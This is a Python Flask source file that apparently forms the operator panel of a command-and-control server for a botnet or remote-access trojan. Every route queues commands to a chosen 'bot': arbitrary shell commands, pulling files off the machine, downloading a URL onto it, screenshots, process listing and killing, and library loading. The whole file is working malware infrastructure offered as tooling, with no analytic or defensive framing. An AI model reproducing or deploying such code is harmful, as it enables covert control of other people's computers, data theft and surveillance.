import sqlite3 as sql
from flask import send_from_directory
from flask import g
from flask import request
from flask import render_template
from flask import redirect, url_for
from flask import session
from enum import Enum
import json

from c2.database import update_bot_record
from c2.app import app
from c2.app import get_db


class Verb(Enum):
    ok = "ok"
    info = "info"
    ps = "ps"
    shell = "shell"
    upload = "upload"
    download = "download"
    kill = "kill"
    screenshot = "screenshot"
    loadlibrary = "loadlibrary"


@app.route('/action/run', methods=['POST'])
def actionrun():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        action = {}
        action['action'] = Verb.shell.value
        action['command'] = request.form['cmd']
        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/upload', methods=['POST'])
def actionupload():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        action = {}
        action['action'] = Verb.upload.value
        action['path'] = request.form['path']
        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/download', methods=['POST'])
def actiondownload():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        action = {}
        action['action'] = Verb.download.value
        action['url'] = request.form['url']
        action['path'] = request.form['filepath']
        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/kill', methods=['POST'])
def actionkill():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        action = {}
        action['action'] = Verb.kill.value
        action['pid'] = int(request.form['pid'])
        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/info', methods=['POST'])
def actioninfo():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        action = {}
        action['action'] = Verb.info.value
        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/ps', methods=['POST'])
def actionps():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        action = {}
        action['action'] = Verb.ps.value
        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/ss', methods=['POST'])
def actionss():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        action = {}
        action['action'] = Verb.screenshot.value
        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/loadlibrary', methods=['POST'])
def actionloadlibrary():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        action = {}
        action['action'] = Verb.loadlibrary.value
        action['path'] = request.form['librarypath']
        update_bot_record.update_commandqueue(conn, request.form['id'], json.dumps(action))
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/clear', methods=['POST'])
def clearqueue():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.update_commandqueue(conn, request.form['id'], '')
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/delete', methods=['POST'])
def deletebot():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.remove_bot_from_db(conn, request.form['id'])
        return redirect(url_for('bots'))
    return 'Error adding command to database'